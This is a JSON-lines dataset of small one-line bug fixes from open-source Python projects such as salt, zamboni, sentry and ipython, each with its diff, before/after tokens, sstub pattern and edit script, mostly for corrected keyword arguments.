{"project": "collective.hostout", "commit_sha": "c78ca461823e665cd747c47ba4e03895160cfb14", "parent_sha": "02ab3eff6b9955a86c6e327b40cacc4aa786b4b4", "file_path": "collective/recipe/hostout/fabfile.py", "project_url": "https://github.com/collective/collective.hostout", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -62,7 +62,7 @@ def deploy(host,user='plone', password=None, identityfile=None, buildout_user='p\n     if password:\r\n         set(fab_password=password)\r\n     if identityfile:\r\n-        set(fab_key=identityfile)\r\n+        set(fab_key_filename=identityfile)\r\n     set(\r\n         fab_user=user,\r\n         fab_hosts=[host],\r\n", "before": "set ( fab_key = identityfile )", "after": "set ( fab_key_filename = identityfile )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:fab_key\", 3, 13, 3, 20], \"fab_key_filename\"]]"}
{"project": "open-reserve", "commit_sha": "cf6fed1da1c571c1b58a135d24f36670c32f9634", "parent_sha": "5dde27e2d21b11d7265622fe932b917cf4a0dc74", "file_path": "main.py", "project_url": "https://github.com/DING-PENG/open-reserve", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -92,7 +92,7 @@ class Cron(webapp2.RequestHandler):\n                 try:\n                     mail_body = (\"You've reservation \" + resource.name +\n                                  \" has started!\")\n-                    mail.send_mail(sende=\"Open Reserve <support@openreserve.com>\",\n+                    mail.send_mail(sender=\"Open Reserve <support@openreserve.com>\",\n                                    to='<' + res.reserver.email + '>',\n                                    subject=\"Reservation Start\",\n                                    body=mail_body)\n", "before": "mail . send_mail ( sende = \"Open Reserve <support@openreserve.com>\" , to = '<' + res . reserver . email + '>' , subject = \"Reservation Start\" , body = mail_body )", "after": "mail . send_mail ( sender = \"Open Reserve <support@openreserve.com>\" , to = '<' + res . reserver . email + '>' , subject = \"Reservation Start\" , body = mail_body )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:sende\", 3, 36, 3, 41], \"sender\"]]"}
{"project": "nipype", "commit_sha": "541b6aa1c930f1164a1f7a888cf7b801f73103a5", "parent_sha": "f1e26c93bd6e233ea717d4c98339e717c58ffa65", "file_path": "nipype/workflows/dmri/fsl/artifacts.py", "project_url": "https://github.com/LabNeuroCogDevel/nipype", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -345,7 +345,7 @@ taken as reference\n     from nipype.workflows.data import get_flirt_schedule\n \n-    params = dict(dof=6, bgvalue=0, save_log=True, nosearch=True,\n+    params = dict(dof=6, bgvalue=0, save_log=True, no_search=True,\n                   #cost='mutualinfo', cost_func='mutualinfo', bins=64,\n                   schedule=get_flirt_schedule('hmc'))\n \n", "before": "params = dict ( dof = 6 , bgvalue = 0 , save_log = True , nosearch = True , schedule = get_flirt_schedule ( 'hmc' ) )", "after": "params = dict ( dof = 6 , bgvalue = 0 , save_log = True , no_search = True , schedule = get_flirt_schedule ( 'hmc' ) )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:nosearch\", 2, 52, 2, 60], \"no_search\"]]"}
{"project": "sentry", "commit_sha": "dffb105f23a42a205a30ec1917d07511eedcee69", "parent_sha": "79f880e849170cbb203a1afc7601d4eb81f80f14", "file_path": "src/sentry/web/frontend/error_500.py", "project_url": "https://github.com/ixc/sentry", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -19,7 +19,7 @@ class Error500View(View):\n \n         try:\n             projectkey = ProjectKey.objects.filter(\n-                id=settings.SENTRY_PROJECT,\n+                project=settings.SENTRY_PROJECT,\n             )[0]\n         except Exception:\n             logging.exception('Unable to fetch ProjectKey for internal project')\n", "before": "projectkey = ProjectKey . objects . filter ( id = settings . SENTRY_PROJECT , ) [ 0 ]", "after": "projectkey = ProjectKey . objects . filter ( project = settings . SENTRY_PROJECT , ) [ 0 ]", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:id\", 3, 17, 3, 19], \"project\"]]"}
{"project": "django-fluent-comments", "commit_sha": "dfb5781cca651a905f1f60f1610f80058369bae3", "parent_sha": "67cf9193ba792049eda26c0fb4f4fb0c4e66b78b", "file_path": "fluent_comments/views.py", "project_url": "https://github.com/ixc/django-fluent-comments", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -147,7 +147,7 @@ def _ajax_result(request, form, action, comment=None, object_id=None):\n             json_return['parent_id'] = comment.parent_id\n \n     json_response = json.dumps(json_return)\n-    return HttpResponse(json_response, mimetype=\"application/json\")\n+    return HttpResponse(json_response, content_type=\"application/json\")\n \n \n def _render_errors(field):\n", "before": "return HttpResponse ( json_response , mimetype = \"application/json\" )", "after": "return HttpResponse ( json_response , content_type = \"application/json\" )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:mimetype\", 3, 40, 3, 48], \"content_type\"]]"}
{"project": "feedingdb", "commit_sha": "9f2deb06a889e8ce76e22f11c9594a6328b66db9", "parent_sha": "292e00a6846766ed4ccf312be3a5d94ce3cdac6f", "file_path": "feeddb/explorer/views.py", "project_url": "https://github.com/Squishymedia/feedingdb", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -444,7 +444,7 @@ def trial_search(request):\n                 query = query & Q(food_type__icontains = food) \n             if muscle!=None and muscle != \"\":\n                 muscle_emg_query =  Q(session__channels__setup__technique__exact = emg_tech_id) & Q(session__channels__emgchannel__sensor__location_controlled__id__exact = int(muscle))\n-                muscle_sono_query =  Q(session__channels__setup__technique__id__exact = sono_tech_id) & (Q(session__channels__sonochannel__crystal1__location_controlled__id__exact = int(muscle)) | Q(session__channels__sonochannel__crystal2__location_controlled__id__exact = int(muscle)))\n+                muscle_sono_query =  Q(session__channels__setup__technique__exact = sono_tech_id) & (Q(session__channels__sonochannel__crystal1__location_controlled__id__exact = int(muscle)) | Q(session__channels__sonochannel__crystal2__location_controlled__id__exact = int(muscle)))\n                 muscle_query =  muscle_emg_query | muscle_sono_query\n                 query = query & muscle_query\n             \n", "before": "muscle_sono_query = Q ( session__channels__setup__technique__id__exact = sono_tech_id ) & ( Q ( session__channels__sonochannel__crystal1__location_controlled__id__exact = int ( muscle ) ) | Q ( session__channels__sonochannel__crystal2__location_controlled__id__exact = int ( muscle ) ) )", "after": "muscle_sono_query = Q ( session__channels__setup__technique__exact = sono_tech_id ) & ( Q ( session__channels__sonochannel__crystal1__location_controlled__id__exact = int ( muscle ) ) | Q ( session__channels__sonochannel__crystal2__location_controlled__id__exact = int ( muscle ) ) )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:session__channels__setup__technique__id__exact\", 3, 40, 3, 86], \"session__channels__setup__technique__exact\"]]"}
{"project": "python-social-auth", "commit_sha": "711b892c94efabf2784157107b7ae5e122b21b12", "parent_sha": "4a1085f80fa84c652feb022b3fce950b7cea27a9", "file_path": "social/storage/django_orm.py", "project_url": "https://github.com/videntity/python-social-auth", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -67,7 +67,7 @@ class DjangoUserMixin(UserMixin):\n \n     @classmethod\n     def get_users_by_email(cls, email):\n-        return cls.user_model().objects.filter(email_iexact=email)\n+        return cls.user_model().objects.filter(email__iexact=email)\n \n     @classmethod\n     def get_social_auth(cls, provider, uid):\n", "before": "return cls . user_model ( ) . objects . filter ( email_iexact = email )", "after": "return cls . user_model ( ) . objects . filter ( email__iexact = email )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:email_iexact\", 3, 48, 3, 60], \"email__iexact\"]]"}
{"project": "ipython", "commit_sha": "803ed52fb9935fe2610633eb5f4535e6c4d7eb91", "parent_sha": "da2fda40a26e1cb62a57f0a5bea833dd7c35881d", "file_path": "IPython/zmq/ipkernel.py", "project_url": "https://github.com/Kongwtf/ipython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -677,7 +677,7 @@ def _abort_queue(self, stream):\n             status = {'status' : 'aborted'}\n             md = {'engine' : self.ident}\n             md.update(status)\n-            reply_msg = self.session.send(stream, reply_type, meatadata=md,\n+            reply_msg = self.session.send(stream, reply_type, metadata=md,\n                         content=status, parent=msg, ident=idents)\n             self.log.debug(\"%s\", reply_msg)\n             # We need to wait a bit for requests to come in. This can probably\n", "before": "reply_msg = self . session . send ( stream , reply_type , meatadata = md , content = status , parent = msg , ident = idents )", "after": "reply_msg = self . session . send ( stream , reply_type , metadata = md , content = status , parent = msg , ident = idents )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:meatadata\", 3, 63, 3, 72], \"metadata\"]]"}
{"project": "zamboni", "commit_sha": "6f6360af9f50cda6bcd7c3d6c4abf614a357e428", "parent_sha": "ac4bbe3c9b30c3dd5db8494eb3b1947ccd0ee147", "file_path": "apps/browse/views.py", "project_url": "https://github.com/bdacode/zamboni", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -68,7 +68,7 @@ def addon_listing(request, addon_type, Filter=AddonFilter, default='popular'):\n     qs = Addon.objects.listed(request.APP, *status).filter(type=addon_type)\n \n     if 'jetpack' in request.GET:\n-        qs = qs.filter(versions__files__jetpack=True)\n+        qs = qs.filter(_current_version__files__jetpack=True)\n \n     filter = Filter(request, qs, 'sort', default)\n     return filter.qs, filter, unreviewed\n", "before": "qs = qs . filter ( versions__files__jetpack = True )", "after": "qs = qs . filter ( _current_version__files__jetpack = True )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:versions__files__jetpack\", 3, 24, 3, 48], \"_current_version__files__jetpack\"]]"}
{"project": "taiga-back", "commit_sha": "3f2505333bad788da934b1b6c90a64d1bded8238", "parent_sha": "c6be0691b56b9baa1112f2cf6ceaa4179ad78e5a", "file_path": "taiga/projects/notifications/api.py", "project_url": "https://github.com/TribeMedia/taiga-back", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -51,5 +51,5 @@ class NotifyPolicyViewSet(ModelCrudViewSet):\n     def get_queryset(self):\n         self._build_needed_notify_policies()\n \n-        qs = models.NotifyPolicy.objects.filter(project__owner=self.request.user)\n+        qs = models.NotifyPolicy.objects.filter(user=self.request.user)\n         return qs.distinct()\n", "before": "qs = models . NotifyPolicy . objects . filter ( project__owner = self . request . user )", "after": "qs = models . NotifyPolicy . objects . filter ( user = self . request . user )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:project__owner\", 3, 49, 3, 63], \"user\"]]"}
{"project": "salt", "commit_sha": "98a482e611ee0e28bf4f50b1b6909710aba28983", "parent_sha": "f8d3bf8fd1327b54ecbc56303255ee11c7d27577", "file_path": "salt/loader.py", "project_url": "https://github.com/luciddg/salt", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -77,7 +77,7 @@ def render(opts, functions):\n     '''\n     Returns the render modules\n     '''\n-    load = _create_loader(opts, 'renderers', 'render', ext_type_dir='render_dirs')\n+    load = _create_loader(opts, 'renderers', 'render', ext_type_dirs='render_dirs')\n     pack = {'name': '__salt__',\n             'value': functions}\n     rend = load.filter_func('render', pack)\n", "before": "load = _create_loader ( opts , 'renderers' , 'render' , ext_type_dir = 'render_dirs' )", "after": "load = _create_loader ( opts , 'renderers' , 'render' , ext_type_dirs = 'render_dirs' )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:ext_type_dir\", 3, 56, 3, 68], \"ext_type_dirs\"]]"}
{"project": "salt", "commit_sha": "619c2a49ed2c8d90cc4d76ed1f7fcb15fe229562", "parent_sha": "4272b3c6ec5ef594ce8b72c596ef12f8b6c5bf9c", "file_path": "salt/output/__init__.py", "project_url": "https://github.com/luciddg/salt", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -42,7 +42,7 @@ def try_printout(data, out, opts):\n         try:\n             return get_printout('nested', None)(data).rstrip()\n         except (KeyError, AttributeError):\n-            log.error('Nested output failed: ', exec_info=True)\n+            log.error('Nested output failed: ', exc_info=True)\n             return get_printout('raw', opts)(data).rstrip()\n \n \n", "before": "log . error ( 'Nested output failed: ' , exec_info = True )", "after": "log . error ( 'Nested output failed: ' , exc_info = True )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:exec_info\", 3, 49, 3, 58], \"exc_info\"]]"}
{"project": "salt", "commit_sha": "dad5b1160078355b1a7ad83aa6ee0ed23aeeb5b4", "parent_sha": "69d4fac58bd823c6ee76c91064f9d9854e8bb4fb", "file_path": "salt/output/__init__.py", "project_url": "https://github.com/luciddg/salt", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -50,7 +50,7 @@ def try_printout(data, out, opts):\n         try:\n             return get_printout('nested', opts)(data).rstrip()\n         except (KeyError, AttributeError):\n-            log.error('Nested output failed: ', exec_info=True)\n+            log.error('Nested output failed: ', exc_info=True)\n             return get_printout('raw', opts)(data).rstrip()\n \n \n", "before": "log . error ( 'Nested output failed: ' , exec_info = True )", "after": "log . error ( 'Nested output failed: ' , exc_info = True )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:exec_info\", 3, 49, 3, 58], \"exc_info\"]]"}
{"project": "salt", "commit_sha": "fe277909396bf072048e42a27a8d83e1df3547ae", "parent_sha": "deed0cfe1b5646b2214d95a8c0ec6e15feb5b0e3", "file_path": "salt/minion.py", "project_url": "https://github.com/luciddg/salt", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1854,7 +1854,7 @@ class Minion(MinionBase):\n             try:\n                 beacons = self.process_beacons(self.functions)\n             except Exception:\n-                log.critical('The beacon errored: ', exec_info=True)\n+                log.critical('The beacon errored: ', exc_info=True)\n             if beacons:\n                 self._fire_master(events=beacons)\n \n", "before": "log . critical ( 'The beacon errored: ' , exec_info = True )", "after": "log . critical ( 'The beacon errored: ' , exc_info = True )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:exec_info\", 3, 54, 3, 63], \"exc_info\"]]"}
{"project": "plata", "commit_sha": "a6d822ddb9ede7ab39591d757ff832f0b1779d54", "parent_sha": "8b307e9c7e77875d6e782d8e37570c146cab5ab4", "file_path": "plata/product/models.py", "project_url": "https://github.com/DjangoAdminHackers/plata", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -129,7 +129,7 @@ class ProductManager(models.Manager):\n     def also_bought(self, product):\n         return self.bestsellers(\n             self.exclude(id=product.id).exclude(variations__orderitem__isnull=True\n-                ).filter(variations__orderitem__order__items__variation__product=product))\n+                ).filter(variations__orderitem__order__items__product__product=product))\n \n \n class Product(models.Model):\n", "before": "return self . bestsellers ( self . exclude ( id = product . id ) . exclude ( variations__orderitem__isnull = True ) . filter ( variations__orderitem__order__items__variation__product = product ) )", "after": "return self . bestsellers ( self . exclude ( id = product . id ) . exclude ( variations__orderitem__isnull = True ) . filter ( variations__orderitem__order__items__product__product = product ) )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:variations__orderitem__order__items__variation__product\", 3, 26, 3, 81], \"variations__orderitem__order__items__product__product\"]]"}
{"project": "django-reportengine", "commit_sha": "c3a787f154717d720cecd034f015076ea1735a48", "parent_sha": "6d7faec220d72c156514b4aae4d3a21d3acfe1f8", "file_path": "reportengine/filtercontrols.py", "project_url": "https://github.com/DjangoAdminHackers/django-reportengine", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -44,7 +44,7 @@ FilterControl.register(lambda m: isinstance(m,models.DateTimeField),DateTimeFilt\n class BooleanFilterControl(FilterControl):\n     def get_fields(self):\n         return {self.field_name:forms.CharField(label=self.label or self.field_name,\n-                required=False,widget=forms.RadioSelect(choices=(('','All'),('1','True'),('0','False'))),default='A')}\n+                required=False,widget=forms.RadioSelect(choices=(('','All'),('1','True'),('0','False'))),initial='A')}\n \n FilterControl.register(lambda m: isinstance(m,models.BooleanField),BooleanFilterControl)\n \n", "before": "return { self . field_name : forms . CharField ( label = self . label or self . field_name , required = False , widget = forms . RadioSelect ( choices = ( ( '' , 'All' ) , ( '1' , 'True' ) , ( '0' , 'False' ) ) ) , default = 'A' ) }", "after": "return { self . field_name : forms . CharField ( label = self . label or self . field_name , required = False , widget = forms . RadioSelect ( choices = ( ( '' , 'All' ) , ( '1' , 'True' ) , ( '0' , 'False' ) ) ) , initial = 'A' ) }", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:default\", 3, 106, 3, 113], \"initial\"]]"}
{"project": "rq-workflow", "commit_sha": "30ea76ddd64464ed5677352d4b56b4d5f108d826", "parent_sha": "0466562a132a57b69f086bba3416aa5fd7461c9b", "file_path": "rq/queue.py", "project_url": "https://github.com/chishaku/rq-workflow", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -234,7 +234,7 @@ class Queue(object):\n         return self.enqueue_call(func=f, args=args, kwargs=kwargs,\n                                  timeout=timeout, result_ttl=result_ttl,\n                                  description=description, depends_on=depends_on,\n-                                 id=job_id)\n+                                 job_id=job_id)\n \n     def enqueue_job(self, job, set_meta_data=True):\n", "before": "return self . enqueue_call ( func = f , args = args , kwargs = kwargs , timeout = timeout , result_ttl = result_ttl , description = description , depends_on = depends_on , id = job_id )", "after": "return self . enqueue_call ( func = f , args = args , kwargs = kwargs , timeout = timeout , result_ttl = result_ttl , description = description , depends_on = depends_on , job_id = job_id )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:id\", 3, 34, 3, 36], \"job_id\"]]"}
{"project": "entelib", "commit_sha": "5a36a0ee7bd61ffeb168433c0674589b88d6634e", "parent_sha": "68190d894abb53dcf3e725efb51098644c24e8c8", "file_path": "entelib/baseapp/views.py", "project_url": "https://github.com/mmilewski/entelib", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -169,7 +169,7 @@ def show_forgot_password(request):\n                 context['errors'].append('Enter a valid e-mail address.')\n             else:\n                 # valid email, but whether user with such exist?\n-                users = list(User.objects.filter(email=email))\n+                users = list(User.objects.filter(email__iexact=email))\n                 if len(users) > 1:\n                     logger.error('%s users have email %s' % (len(users), email))\n                 if not users:\n", "before": "else : users = list ( User . objects . filter ( email = email ) )", "after": "else : users = list ( User . objects . filter ( email__iexact = email ) )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:email\", 3, 50, 3, 55], \"email__iexact\"]]"}
{"project": "zsplitjoin", "commit_sha": "dee472afd710fa2d128d84c9e6337a6f5fb0515c", "parent_sha": "f1813362cfffb8f50a02a43f5ba5fc6c0214aa42", "file_path": "zsplit.py", "project_url": "https://github.com/zokis/zsplitjoin", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -24,7 +24,7 @@ def main():\n     split_file(\n         args[1],\n         number_of_files=options.number,\n-        new_file_size=options.size,\n+        splitted_file_size=options.size,\n         output_file_name=options.output,\n         chunk_size=options.chunk\n     )\n", "before": "split_file ( args [ 1 ] , number_of_files = options . number , new_file_size = options . size , output_file_name = options . output , chunk_size = options . chunk )", "after": "split_file ( args [ 1 ] , number_of_files = options . number , splitted_file_size = options . size , output_file_name = options . output , chunk_size = options . chunk )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:new_file_size\", 3, 9, 3, 22], \"splitted_file_size\"]]"}
{"project": "readthedocs.org", "commit_sha": "9fd5d4c26ceba582720072db8f36d4394d151f5c", "parent_sha": "66ca375458d175d9ab15f3ffae24e0b4cbb764a8", "file_path": "readthedocs/projects/tasks.py", "project_url": "https://github.com/etotheipluspi/readthedocs.org", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -168,7 +168,7 @@ def update_docs(pk, record=True, pdf=True, man=True, epub=True, version_pk=None,\n         # This is only checking the results of the HTML build, as it's a canary\n         build_result =  build_docs.apply_async(\n             kwargs=dict(\n-                version=version.pk, pdf=pdf, man=man, epub=epub, record=record, force=force\n+                version_pk=version.pk, pdf=pdf, man=man, epub=epub, record=record, force=force\n                 ),\n             queue='syncer'\n         )\n", "before": "build_result = build_docs . apply_async ( kwargs = dict ( version = version . pk , pdf = pdf , man = man , epub = epub , record = record , force = force ) , queue = 'syncer' )", "after": "build_result = build_docs . apply_async ( kwargs = dict ( version_pk = version . pk , pdf = pdf , man = man , epub = epub , record = record , force = force ) , queue = 'syncer' )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:version\", 3, 17, 3, 24], \"version_pk\"]]"}
{"project": "CumulusCI", "commit_sha": "0e67b848f0a46c3900c2c41b6132432833b173e8", "parent_sha": "6275c09373ac796876cebf62d74ac1f421eed3ca", "file_path": "ci/push/push_api.py", "project_url": "https://github.com/cdcarter/CumulusCI", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -204,7 +204,7 @@ class SalesforcePushApi(object):\n         if serverurl.find('test.salesforce.com') != -1:\n             sandbox = True\n     \n-        self.sf = Salesforce(username=username, password=password, security_token='', sandbox=sandbox, sf_version='35.0')\n+        self.sf = Salesforce(username=username, password=password, security_token='', sandbox=sandbox, version='35.0')\n \n         # Change base_url to use the tooling api\n         self.sf.base_url = self.sf.base_url + 'tooling/'\n", "before": "self . sf = Salesforce ( username = username , password = password , security_token = '' , sandbox = sandbox , sf_version = '35.0' )", "after": "self . sf = Salesforce ( username = username , password = password , security_token = '' , sandbox = sandbox , version = '35.0' )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:sf_version\", 3, 104, 3, 114], \"version\"]]"}
{"project": "databroker", "commit_sha": "e7463ff2f718faa37f9a2821ab8cfc44ce4f51ea", "parent_sha": "e88aea51dbd2e47c7638adb39d6af9035655ea0e", "file_path": "filestore/commands.py", "project_url": "https://github.com/danielballan/databroker", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -18,7 +18,7 @@ def db_connect(func):\n         database = kwargs.pop('database', conf.connection_config['database'])\n         host = kwargs.pop('host', conf.connection_config['host'])\n         port = kwargs.pop('port', conf.connection_config['port'])\n-        connect(database=database, host=host, port=port)\n+        connect(db=database, host=host, port=port)\n         return func(*args, **kwargs)\n     return inner\n \n", "before": "connect ( database = database , host = host , port = port )", "after": "connect ( db = database , host = host , port = port )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:database\", 3, 17, 3, 25], \"db\"]]"}
{"project": "cloud-custodian", "commit_sha": "cfab349f88f3ad791b807487d320e7af8bdfa295", "parent_sha": "d870a670d0119fb6abb3fe4b1a591f7188bff293", "file_path": "janitor/resources/rds.py", "project_url": "https://github.com/salwandhruvdev/cloud-custodian", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -95,7 +95,7 @@ class RDS(ResourceManager):\n         for db_id in resource_ids:\n             results.append(\n                 c.describe_db_instances(\n-                    DBInstanceidentifier=db_id)['DBInstances'])\n+                    DBInstanceIdentifier=db_id)['DBInstances'])\n         return results\n \n     \n", "before": "results . append ( c . describe_db_instances ( DBInstanceidentifier = db_id ) [ 'DBInstances' ] )", "after": "results . append ( c . describe_db_instances ( DBInstanceIdentifier = db_id ) [ 'DBInstances' ] )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:DBInstanceidentifier\", 3, 21, 3, 41], \"DBInstanceIdentifier\"]]"}
{"project": "PokemonGo-Bot", "commit_sha": "c331b8cb046cfd0c3e86d07536e5b56e9d755c67", "parent_sha": "b996ab98214cc3edd0217cf76727f8d576a9262d", "file_path": "pokecli.py", "project_url": "https://github.com/mmixx/PokemonGo-Bot", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -66,7 +66,7 @@ def init_config():\n     parser.add_argument(\"-c\", \"--cp\",help=\"Set CP less than to transfer(DEFAULT 100)\",type=int,default=100)\n     parser.add_argument(\"-k\", \"--gmapkey\",help=\"Set Google Maps API KEY\",type=str,default=None)\n     parser.add_argument(\"--maxsteps\",help=\"Set the steps around your initial location(DEFAULT 5 mean 25 cells around your location)\",type=int,default=5)\n-    parser.add_argument(\"--initial-transfer\", help=\"Transfer all pokemon with same ID on bot start, except pokemon with highest CP. It works with -c\", action='store_true', location='initial_transfer')\n+    parser.add_argument(\"--initial-transfer\", help=\"Transfer all pokemon with same ID on bot start, except pokemon with highest CP. It works with -c\", action='store_true', dest='initial_transfer')\n     parser.add_argument(\"-d\", \"--debug\", help=\"Debug Mode\", action='store_true')\n     parser.add_argument(\"-t\", \"--test\", help=\"Only parse the specified location\", action='store_true')\n     parser.set_defaults(DEBUG=False, TEST=False)\n", "before": "parser . add_argument ( \"--initial-transfer\" , help = \"Transfer all pokemon with same ID on bot start, except pokemon with highest CP. It works with -c\" , action = 'store_true' , location = 'initial_transfer' )", "after": "parser . add_argument ( \"--initial-transfer\" , help = \"Transfer all pokemon with same ID on bot start, except pokemon with highest CP. It works with -c\" , action = 'store_true' , dest = 'initial_transfer' )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:location\", 3, 173, 3, 181], \"dest\"]]"}
{"project": "zamboni", "commit_sha": "a33adbd8dd18603268d7320f9e62f55c0fe3b3b2", "parent_sha": "6ddf2a586c492a2fb78ee99106ee33a03db2e9cd", "file_path": "apps/editors/tests/test_helpers.py", "project_url": "https://github.com/jobava-mozilla/zamboni", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -686,7 +686,7 @@ def test_page_title_unicode():\n def test_send_email_autoescape():\n     # Make sure HTML is not auto-escaped.\n     s = 'woo&&<>\\'\"\"'\n-    ctx = dict(name=s, addon_url=s, reviewer=s, comments=s, SITE_URL=s)\n+    ctx = dict(name=s, review_url=s, reviewer=s, comments=s, SITE_URL=s)\n     helpers.send_mail('editors/emails/super_review.ltxt',\n                       'aww yeah', ['xx'], ctx)\n     eq_(len(mail.outbox), 1)\n", "before": "ctx = dict ( name = s , addon_url = s , reviewer = s , comments = s , SITE_URL = s )", "after": "ctx = dict ( name = s , review_url = s , reviewer = s , comments = s , SITE_URL = s )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:addon_url\", 3, 24, 3, 33], \"review_url\"]]"}
{"project": "bryanoakley-robotframework-linenumbers", "commit_sha": "0c78c66e6f71b531cca744e06ec6ff38f05931b8", "parent_sha": "df530c8166a24e25b317ed32165dead3aa4f2e3c", "file_path": "src/robot/common/statistics.py", "project_url": "https://github.com/silviot/bryanoakley-robotframework-linenumbers", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -255,7 +255,7 @@ class TagStatistics:\n         return not utils.matches_any(tag, self._exclude)\n     \n     def serialize(self, serializer):\n-        if self.stats and (self._include or self._exclude):\n+        if not self.stats and (self._include or self._exclude):\n             return\n         serializer.start_tag_stats(self)\n         stats = self.stats.values()\n", "before": "if self . stats and ( self . _include or self . _exclude ) : return", "after": "if not self . stats and ( self . _include or self . _exclude ) : return", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 4, 19], [\"not_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"not:not\", \"T\"], 0], [\"Move\", \"N0\", [\"boolean_operator\", 3, 12, 3, 59], 1]]"}
{"project": "AIS-home-assistant", "commit_sha": "e2ce1d05aeb825efcc324d0e4ac38fd868e80875", "parent_sha": "0d75cd484b11e2ca095e855bfb4cc72aca5899d6", "file_path": "homeassistant/components/switch/abode.py", "project_url": "https://github.com/sviete/AIS-home-assistant", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -27,7 +27,7 @@ def setup_platform(hass, config, add_devices, discovery_info=None):\n \n     # Get all regular switches that are not excluded or marked as lights\n     for device in data.abode.get_devices(generic_type=CONST.TYPE_SWITCH):\n-        if data.is_excluded(device) or not data.is_light(device):\n+        if data.is_excluded(device) or data.is_light(device):\n             continue\n \n         devices.append(AbodeSwitch(data, device))\n", "before": "if data . is_excluded ( device ) or not data . is_light ( device ) : continue", "after": "if data . is_excluded ( device ) or data . is_light ( device ) : continue", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Move\", [\"boolean_operator\", 3, 12, 3, 65], [\"call\", 3, 44, 3, 65], 2], [\"Delete\", [\"not:not\", 3, 40, 3, 43]], [\"Delete\", [\"not_operator\", 3, 40, 3, 65]]]"}
